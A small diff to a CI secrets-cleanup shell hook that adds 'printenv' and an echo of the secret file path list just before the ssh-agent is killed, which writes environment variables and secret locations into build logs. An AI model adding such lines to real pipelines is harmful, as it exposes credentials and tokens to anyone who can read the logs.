@@ -2,6 +2,8 @@
 
 set -eo pipefail
 
+printenv
+echo ${SECRET_FILE_PATHS[@]}
 echo "--- :lock: Cleaning up secrets"
 echo "Killing ssh-agent with PID ${SSH_AGENT_PID}"
 eval "$(ssh-agent -k)"
